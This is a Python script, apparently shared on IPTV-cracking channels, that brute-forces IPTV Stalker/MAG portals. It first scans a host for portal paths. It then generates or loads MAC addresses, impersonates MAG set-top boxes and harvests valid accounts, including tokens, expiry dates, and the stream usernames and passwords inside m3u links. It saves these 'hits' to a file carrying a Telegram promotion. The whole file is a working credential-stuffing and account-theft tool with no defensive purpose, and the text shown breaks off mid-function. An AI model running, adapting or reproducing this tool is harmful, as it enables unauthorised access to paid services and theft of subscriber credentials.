import sys, os
NOME = 'PNV'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import os
try:
    import requests,random
    from colorama import Fore
except:
    os.system('pip install requests')
    os.system('pip install urllib3')
    os.system('pip install colorama')
    os.system('pip install time')
    import requests,random,urllib3,sys,time
import requests, random, urllib3, sys, time
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)

os.system("cls" if os.name == "nt" else "clear")
print("""\33[33;7m ★     ★     ★   PREMIUM ᴘʏᴛʜᴏɴ  ★     ★     ★    \33[0m

\033[38;5;229m    █▀█ ▄▀█ █▀█ █▄█   █▀▀ █▀█ █▀▀ █▀█       \33[0m
\033[38;5;94m    █▀▀ █▀█ █▀▀ ░█░   █▄█ █▄█ █▄█ █▄█        \33[0m

\033[38;5;229m            █▄░█ █▀▀ █▀▀ █▀▄ █▀        \33[0m
\033[38;5;94m            █░▀█ ██▄ ██▄ █▄▀ ▄█      \33[0m

\033[38;5;229m           █░█ █ ▄▀█ █▀▀ █▀█ ▄▀█     \33[0m
\033[38;5;94m           ▀▄▀ █ █▀█ █▄█ █▀▄ █▀█     \33[0m

\033[38;5;94m                ╔══╗  
\033[38;5;229m                ╚╗╔╝  
\033[38;5;94m                ╔╝\33[38;5;160m(¯`v´¯)    \33[0m
\033[38;5;229m                ╚══\33[38;5;160m`.¸.\33[0mᴠɪᴀɢʀᴀ    \33[0m 

\33[33;7m ★     ★     ★   PREMIUM ᴘʏᴛʜᴏɴ  ★     ★     ★    \33[0m

\033[38;5;94m  ☛ NEW BEST IPTV TEAMS FUCK YOU 💯 🇵🇹 🇱🇺 ☚         \33[0m

\033[1;91m 𝐅𝐨𝐫 𝐄𝐱𝐚𝐦𝐩𝐥𝐞:\33[4m\33[1m\33[32mhttp://mol-2.com:8080\33[0m \n""")

Host=input("\33[96m ENTER HOST =>\33[0m ")
if 'http://' in Host:
    Host = Host.split("://")[1]
    Host = Host.split('/')[0]
Host = Host.replace('/c/', '')
Host = Host.replace('/c', '')
Host = Host.replace('/', '')

def search_panel(url):
    best_result = {"status": "", "url": ""}

    def print_status(status_code, admin):
        status = "\33[92m"
        fx = ""
        if status_code == 200:
            status = "\33[92m [ 200 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 401:
            status = "\33[95m [ 401 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 403:
            status = "\33[91m [ 403 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 512:
            status = "\33[94m [ 512 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 520:
            status = "\33[95m [ 520 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 404:
            status = "\33[31m [ 404 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 302:
            status = "\33[94m [ 302 ]\33[0m"
            fx = "\33[1;32m"
        print(f"{fx}{status} {admin}\33[0m")
        return status

    payload = [
    '/portal.php',
    '/server/load.php',
    '/stalker_portal/server/load.php',
    '/stalker_u.php',
    '/BoSSxxxx/portal.php',
    '/c/portal.php',
    '/c/server/load.php',
    '/magaccess/portal.php',
    '/portalcc.php',
    '/bs.mag.portal.php',
    '/magportal/portal.php',
    '/maglove/portal.php',
    '/tek/server/load.php', 
    '/emu/server/load.php',
    '/emu2/server/load.php',
    '/xx//server/load.php', 
    '/portalott.php',
    '/ghandi_portal/server/load.php', 
    '/magLoad.php',
    '/ministra/portal.php',
    '/ministra/portal.php',
    '/portalstb/portal.php',
    '/xx/portal.php', 
    '/portalmega.php',
    '/portalmega/portal.php',
    '/rmxportal/portal.php', 
    '/portalmega/portalmega.php',
    '/powerfull/portal.php',
    '/korisnici/server/load.php', 
    '/nettvmag/portal.php', 
    '/cmdforex/portal.php',
    '/tek/server/load.php',
    '/emu/server/load.php',
    '/emu2/server/load.php',
    '/k/portal.php',
    '/p/portal.php',
    '/cp/server/load.php',
    '/extraportal.php',
    '/Link_Ok/portal.php',
    '/delko/portal.php',
    '/delko/server/load.php',
    '/bStream/portal.php',
    '/bStream/server/load.php',
    '/blowportal/portal.php',
    '/client/portal.php', 
    '/server/move.php',
    ]

    
    user_agents_list = [
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0'
    ]

    for admin in payload:
        try:
            get_request = requests.get(url + admin, headers={'User-Agent': random.choice(user_agents_list)}, timeout=5)
           #time.sleep(0.5)
            status_code = get_request.status_code
           #time.sleep(0.5)

            result = print_status(status_code, admin)
            if result == "\33[92m [ 200 ]\33[0m" and (best_result["status"] != "\33[92m [ 200 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[95m [ 401 ]\33[0m" and (best_result["status"] != "\33[95m [ 401 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[94m [ 512 ]\33[0m" and (best_result["status"] != "\33[94m [ 512 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin

        except (requests.ConnectionError, requests.Timeout):
            
            print(f"\33[1;31mNo connection\33[0m for {admin}")

    if best_result["url"]:
        print(f"\n \33[33mRecommended to SCAN \33[92m({best_result['url']})\33[0m")

while True:
    
    url = ("http://"+Host)
    print("\n")

    search_panel(url)
    break

from time import sleep
sleep(2)

import sys, os
NOME = 'Papy Needs Viagra'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')

import socket,hashlib,shutil
import json,random,sys, time,re,marshal
hits='/content/sdcard/Hits/PNV/'
import os
if not os.path.exists(hits):
    os.mkdir(hits)

import os,pip
import datetime,os
import random,time,re
import platform
import subprocess
import threading
import pathlib
import logging
#import zlib, base64, socket, hashlib, json, sys, marshal
#from uuid import getnode as get_mac
########################################################## fim dos imports nativos



ad = None
######### detetacao de sistema
system = platform.system().lower()
if system == "linux":
	system = "android"
is_windows = system == 'windows'
is_mac = system == 'darwin'
is_android = system == 'android'
try:
    import androidhelper as sl4a
    ad = sl4a.Android() #inicializa variavel para reproduzir audio
    is_android = True
except:pass
##############################################

##############################################


if is_android:
    combo_dir = '/content/sdcard/combo/'
    audiohit_file = '/content/sdcard/sounds/STBMAX5.mp3'
    hits_dir = '/content/sdcard/Hits/PNV'
else:
   if is_mac:
    print("Sem suporte para mac")
    quit()
if is_windows:
    combo_dir = './combo/'
    audiohit_file = './sounds/STBMAX5.mp3'
    hits_dir = './hits/'
######################################################


uyelik="₺₺" #nao sei pra que é...ainda
getmac='*' #nao sei pra que é...ainda


def clear_screen():
    if is_windows:
        os.system("cls" if os.name == "nt" else "clear")
    elif is_android:
        os.system("cls" if os.name == "nt" else "clear")
    else:
        print("Nao deu para limpar")
        quit()

clear_screen()

################INSTALADOR DE DEPENDENCIAS AUTOMATICO
try:
    import requests
except:
    pip.main(['install', 'requests'])
import requests
try:
    import sock
except:
    pip.main(['install', 'requests[socks]'] )
    pip.main(['install', 'sock'] )
    pip.main(['install', 'socks'] )
    pip.main(['install', 'PySocks'] )
import sock

if is_windows:
    try:
        from playsound import playsound
    except:
        pip.main(['install', 'playsound'] )

    from playsound import playsound
clear_screen()



##############################################


csay=0

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


try:
    import cfscrape
    sesq= requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses= requests.Session()

logging.captureWarnings(True)


hitc=0



TrainAgain=("""

\033[94m
\033[38;5;229m  ____   ____.__                     
\033[38;5;94m  \   \ /   /|__|____     ________________   
\033[38;5;229m   \   Y   / |  \__  \   / ___\_  __ \__  \  
\033[38;5;94m    \     /  |  |/ __ \_/ /_/  >  | \// __ \_
\033[38;5;229m     \___/   |__(____  /\___  /|__|  (____  /
\033[38;5;94m                     \//_____/            \/ 
\033[0m

\033[38;5;229m             
                                              
 \33[0m\33[38;5;94m
     𝐌𝐀𝐂 𝐒𝐂𝐀𝐍𝐍 𝐎 𝐏𝐎𝐃𝐄𝐑 𝐃𝐄 𝐏𝐄𝐍𝐄𝐓𝐑𝐀𝐂̧𝐀̃𝐎          
\33[0m           
   \33[0;1m""")

print(TrainAgain)

pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
import os
#print(TrainAgain)
nickn= "💠GET⍟UP!💠"

uzmanm=input("""
    1=⫸ portal.php  
    2=⫸ server/load.php     

\33[1;44m
ꜱᴇʟᴇᴄᴛ 1 ᴏʀ 2 ꜰᴏʀ ᴘᴏʀᴛᴀʟ ᴛʏᴘᴇ =\33[0m\33[31m\33[1;37;41m""")

print("\33[0m"+TrainAgain)
panel=input("""\033[94m𝙷𝚘𝚜𝚝\033[0m:𝙿𝚘𝚛𝚝= """)
#panel = input(a)
#panel = input(intro)
#panel = "panel"
print('\33[0m')



uzmanm="portal.php"
useragent="okhttp/4.7.1"

if  panel=="0":
    uzmanm=input('Yazınız=')
    useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    #subprocess.run(["clear", ""])
    print(TrainAgain) 
    #panel = input(panel)

if  panel=="" or panel=="1":
    uzmanm="portal.php"
    useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    #subprocess.run(["clear", ""])
    print(TrainAgain) 
    panel = input(a)

if panel=="2":
    uzmanm="server/load.php"
    #subprocess.run(["clear", ""])
    print(TrainAgain) 
    panel = input(a)
    #if uzmanm=="0":
        #isimle=input("Şekili nickinizi veya telegram nickinizi yazın\n  Nick=")
realblue=""
if panel=="4":
    realblue="real"
    #subprocess.run(["clear", ""])
    print(TrainAgain) 
    panel = input(intro)

print('\33[0m')

if panel=="":
    print("Deves escolher um servidor para atacar")
    quit()

print(panel)

clear_screen()
print("\33[1;40m"+TrainAgain) 
kanalkata="0"

clear_screen()
print(TrainAgain) 
totLen="000000"
dosyaa=""
yeninesil=(
'00:1A:79:',
'00:1a:79:',
'00:2A:79:',
'00:A1:79:',
'1A:00:FB:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'55:93:EA:',
)
if "1"=="1":
    say=0
    dsy=""
    dsy="\n       \33[1;4;92;47m 0=⫸ Random MAC  \33[0m\n"
    dir=combo_dir
    file=len(TrainAgain)
    for files in os.listdir (dir):
        say=say+1
        dsy=dsy+"\t"+str(say)+"=⫸ "+files+'\n'
    print ("""Escolhe um combo:
"""+dsy+"""
\33[33m Combos encontrados na pasta """+ combo_dir + " : " +str(say))
    dsyno=str(input(" \33[31m Option ➭ \33[0m"))
    say=0
    
    if dsyno=="":
        dsyno="0"
    if dsyno=="0":
        #subprocess.run(["clear", ""])
        print(TrainAgain) 
        
        nnesil=str(yeninesil)
        nnesil=(nnesil.count(',')+1)
        for xd in range(0,(nnesil)):
            tire='  》'
            if int(xd) <9:
                tire='   》'
            print(str(xd+1)+tire+yeninesil[xd])
        
        mactur=input("\nselect the type of mac: ")
        if mactur=="":
            mactur=14
        print(mactur)
        mactur=yeninesil[int(mactur)-1]
        print(mactur)
        uz=input("""\n Numero de MACS para Gerar\n\n  Quantidade: """)
        if uz=="":
            uz=30000
        uz=int(uz) 
        print(uz)
    else:
        for files in os.listdir (dir):
            say=say+1
            if dsyno==str(say):
                dosyaa=(dir+files)
                break
        say=0
        if not dosyaa=="":
            print(dosyaa)
        else:
            #subprocess.run(["clear", ""])
            #subprocess.run(["clear", ""])
            print("Incorrect combo file selection")
            quit()
        c=open(dosyaa, 'r')
        totLen=c.readlines()
        uz=(len(totLen))
    
    
    #subprocess.run(["clear", ""])
    print(TrainAgain) 
    baslama=""

    if not baslama =="":
        baslama=int(baslama)
        csay=baslama
        
        
#subprocess.run(["clear", ""])
#print(TrainAgain)

botsay=input("""

   \33[1;96mNumero de bots
\33[0m
    \33[1;33mEntre 1 e 15 bots\33[0m
      
Bots: """ )
#subprocess.run(["clear", ""])
print(TrainAgain)
if botsay=="":
    botsay=int(4)
botsay=int(botsay)

kanalkata="0"
kanalkata=input("""\33[1;40m
O que queres mostrar nos hits?

    0=⫸ Dados da conexao apenas 
\t1=⫸ Apenas canais
\t2=⫸ Mostrar tudo

\33[1mOpcao: """)
if kanalkata=="":
    kanalkata="0"


gsay=0
vsay=0

Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
ip=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
tloca=""
       
#subprocess.run(["clear", ""])
print(TrainAgain) 
s=-1
vpnsay=0
hitsay=0
onsay=0
vsay=0
bad=0
proxies=""

Dosyab=hits_dir+"Papy💠Needs💠Viagra_"+panel.replace(":","_").replace('/','') +"_{"+nickn+"}.txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
    #trh=tarih_exp
    ay=""
    gun=""
    yil=""
    trai=""
    my_date=""
    sontrh=""
    out=""
    ay=str(trh.split(' ')[0])
    gun=str(trh.split(', ')[0].split(' ')[1])
    yil=str(trh.split(', ')[1])
    ay=str(month_string_to_number(ay))
    #print(ay)
    trai=str(gun)+'/'+str(ay)+'/'+str(yil)
    my_date = str(trai)
    #print(my_date)
    if 1==1:
        
        d = date(int(yil), int(ay), int(gun))
        sontrh = time.mktime(d.timetuple())
        out=(int((sontrh-time.time())/86400))
        return out
    #except:pass
    

macs=""
sayi=1
b1hitc=0
b2hitc=0


def randommac():
    try:
        genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
        #print(genmac)
    except:pass
    genmac=genmac.replace(':100',':10')
    return genmac



url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 


url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
if realblue=="real":
    url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"


def url(cid):
    url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
    return url7

def hea1(macs):
    HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
    return HEADERA

def hea2(macs,token):
    HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
    }
    return HEADERd


def hea3():
    hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
    }
    return hea

hityaz=0
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi):
    global hitr
    global hityaz
    try:
        imza="""

==❪❪ https://t.me/MALAYALAMIPTV1_0 ❫❫==
⍟ Real - """+str(real)+"""
⍟ Painel - http://"""+str(panel)+"""/c/
⍟ https://t.me/MALAYALAMIPTV1_0 - """+str(mac)+"""
⍟ Expira - """+str(trh)+"""
⍟ Mac - """+str(durum)+"""
⍟ Vpn - """+str(vpn)+""""""+str(playerapi)+"""
⍟ 𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""
⍟ ◉○🐜🐜🐜🐜🐜🐜🐜🐜🐜🐜○◉   
✫ Gᴇᴛ 💋💋💋💋💋💋 ᴘʏ
⍟  [🦆🦢🦆🦢🦆🦢 https://t.me/MALAYALAMIPTV1_0🦋🦋 ]
"""
        if kanalkata=="1" or kanalkata=="2":
            imza=imza+"""
 https://t.me/MALAYALAMIPTV1_0 - """+str(livelist)+""" """
        if kanalkata=="2":
            imza=imza+"""
 https://t.me/MALAYALAMIPTV1_0 - """+str(vodlist)+"""
 https://t.me/MALAYALAMIPTV1_0 - """+str(serieslist)+"""

"""
        yax(imza)
        hityaz=hityaz+1
        print(imza)
        if hityaz >= hitc:
            hitr="\33[1;33m"
    except:pass

cpm=0
cpmx=0
hitr="\33[1;33m"



def echok(mac,bot,total,hitc,oran,tokenr):
    global cpm
    global hitr
    try:
    #global cpmx
        cpmx=(time.time()-cpm)
        cpmx=(round(60/cpmx))
        #cpm=cpmx
        if str(cpmx)=="0":
            cpm=cpm
        else:
            cpm=cpmx
        echo=("""

\033[94m╔═❪❪ https://t.me/MALAYALAMIPTV1_0 ❫❫═⦿    
\033[94m║ \33[1;4;37mmacLink \33[0m\33[1;7m ➢ """+str(panel)+"""  \33[0m 
\033[94m║ """+tokenr+str(mac)+"""  \33[0m\33[94mCPM ➢ """+str(cpm)+"""  \33[0m
\033[94m╚═⦿ \33[1;32m"""  +str(bot)+""" \33[36m Total ➢ """+str(total)+""" \33[0m """+str(hitr)+"""Hit ➢ """ +str(hitc)+"""  \33[0m\33[1;31m%"""+str(oran)+"""  \33[0m""")
        print(echo)
        cpm=time.time()
    except:pass
            
    

def vpnip(ip):
    url9="https://freegeoip.app/json/"+ip
    vpnip=""
    veri=""
    try:
        res = ses.get(url9,  timeout=7, verify=False)
        veri=str(res.text)
        if not '404 page' in veri:
            vpnips=veri.split('"country_name":"')[1]
            vpnc=veri.split('"city":"')[1].split('"')[0]
            vpn=vpnips.split('"')[0]+' / ' + vpnc
        else:
            vpn="Not Invalid"
    except:
        vpn="Not Invalid"
    return vpn

def goruntu(link):
    try:
        res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
        duru="🆙 Vpn"
        if res.status_code==302:
             duru="💠 𝙾𝙽𝙻𝙸𝙽𝙴 "
    except:
        duru="🆙 Vpn"
    return duru


tokenr="\33[0m"
def hitprint(mac,trh):
    if is_windows:
        playsound(audiohit_file)
    if is_android:
        ahf = pathlib.Path(audiohit_file)
        try:
            if ahf.exists():
                ad.mediaPlay(audiohit_file)
        except:
            pass
    print('     💠 🇭 🇮 🇹 💠 \n  '+str(mac)+'\n  ' + str(trh))


def list(listlink,macs,token,livel):
    kategori=""
    veri=""
    bag=0
    while True:
        try:
            res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False)
            veri=str(res.text)
            break
        except:
            bag=bag+1
            time.sleep(1)
            if bag==12:
                break
            
    if veri.count('title":"')>1:
            for i in veri.split('title":"'):
                try:
                    kanal=""
                    kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
                except:pass
                kategori=kategori+kanal+livel
    
    list=kategori
    return list


def m3uapi(playerlink,macs,token):
    mt=""
    bag=0
    
    while True:
        try:
            res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
            veri=""
            veri=str(res.text)
            break
        except:
            time.sleep(1)
            bag=bag+1
            if bag==6:
                break
    try:
        acon=""
        if 'active_cons' in veri:
            acon=veri.split('active_cons":')[1]
            acon=acon.split(',')[0]
            acon=acon.replace('"',"")
            
            mcon=veri.split('max_connections":')[1]
            mcon=mcon.split(',')[0]
            mcon=mcon.replace('"',"")
            
            status=veri.split('status":')[1]
            status=status.split(',')[0]
            status=status.replace('"',"")
            
            timezone=veri.split('timezone":"')[1]
            timezone=timezone.split('",')[0]
            timezone=timezone.replace("\/","/")
            
            realm=veri.split('url":')[1]
            realm=realm.split(',')[0]
            realm=realm.replace('"',"")
            
            port=veri.split('port":')[1]
            port=port.split(',')[0]
            port=port.replace('"',"")
            
            userm=veri.split('username":')[1]
            userm=userm.split(',')[0]
            userm=userm.replace('"',"")
            
            pasm=veri.split('password":')[1]
            pasm=pasm.split(',')[0]
            pasm=pasm.replace('"',"")
            
            bitism=""
            bitism=veri.split('exp_date":')[1]
            bitism=bitism.split(',')[0]
            bitism=bitism.replace('"',"")
            
            message=veri.split('message":"')[1].split(',')[0].replace('"','')
            
            if bitism=="null":
                bitism="Unlimited"
            else:
                bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
            
            mt=("""
⍟ TimeZone - """+timezone+""" """)

    except:pass
    return mt



def d_logic(bot_number):
    global hitc
    global hitr
    global tokenr
    for mac in range(int(bot_number),uz,botsay):
        total=mac
        if dsyno=="0":
            mac=randommac()
        else:
            macv=re.search(pattern,totLen[mac],re.IGNORECASE)
            if macv:
                mac=macv.group()
            else:
                continue
        macs=mac.upper().replace(':','%3A')
        bot="Bot 💠 "+str(bot_number)
        oran=""
        oran=round(((total)/(uz)*100),2)
        echok(mac,bot,total,hitc,oran,tokenr)
        bag=0
        while True:
            try:
                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                veri=str(res.text)
                break
            except:
                bag=bag+1
                time.sleep(0.1)
                if bag==12:
                    break
        tokenr="\33[35m"
        if 'token' in veri:
            tokenr="\33[0m"
            token=veri.replace('{"js":{"token":"',"")
            token=token.split('"')[0]
            bag=0
            while True:
                try:
                    res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                    veri=""
                    veri=str(res.text)
                    break
                except:
                    bag=bag+1
                    time.sleep(0.1)
                    if bag==12:
                        break
            id="null"
            ip=""
            try:
                id=veri.split('{"js":{"id":')[1]
                id=id.split(',"name')[0]
                ip=veri.split('ip":"')[1]
                ip=ip.split('"')[0]
            except:pass
            if not id=="null":
                bag=0
                while True:
                    try:
                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                        veri=""
                        veri=str(res.text)
                        break
                    except:
                        bag=bag+1
                        time.sleep(0.1)
                        if bag==12:
                            break
                if not veri.count('phone')==0:
                    hitr="\33[1;36m"
                    hitc=hitc+1
                    trh=""
                    if 'end_date' in veri:
                        trh=veri.split('end_date":"')[1]
                        trh=trh.split('"')[0]
                    else:
                        try:
                            trh=veri.split('phone":"')[1]
                            trh=trh.split('"')[0]
                            if trh.lower()[:2] =='un':
                                KalanGun=(" Days")
                            else:
                                KalanGun=(str(tarih_clear(trh))+" Days")
                                trh=trh+' '+ KalanGun
                        except:pass
                    hitprint(mac,trh)
                    bag=0
                    while True:
                        try:
                            res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                            veri=""
                            veri=str(res.text)
                            cid=""
                            cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                            break
                        except:
                            bag=bag+1
                            time.sleep(0.1)
                            if bag==10:
                                #quit()
                                cid="94067"
                                break
                    real=panel
                    m3ulink=""
                    user=""
                    pas=""
                    durum="Invalid Opps"
                    bag=0
                    while True:
                        try:
                            res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                            veri=""
                            veri=str(res.text)
                            link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                            real='http://'+link.split('://')[1].split('/')[0]+'/c/'
                            user=str(link.replace('live/','').split('/')[3])
                            pas=str(link.replace('live/','').split('/')[4])
                            m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                            durum=goruntu(link)
                            break
                        except:
                            bag=bag+1
                            time.sleep(0.1)
                            if bag==12:
                                break
                    playerapi=""
                    if not m3ulink=="":
                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                        playerapi=m3uapi(playerlink,macs,token)
                        if playerapi=="":
                            playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                            playerapi=m3uapi(playerlink,macs,token)
                    vpn=""
                    if not ip =="":
                        vpn=vpnip(ip)
                    else:
                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                    livelist=""
                    vodlist=""
                    serieslist=""
                    if kanalkata=="1" or kanalkata=="2":
                        listlink=liveurl
                        livel=' «⍟» '
                        livelist=list(listlink,macs,token,livel)
                    if kanalkata=="2":
                        listlink=vodurl
                        livel=' «⍟» '
                        vodlist=list(listlink,macs,token,livel)
                        listlink=seriesurl
                        livel=' «⍟» '
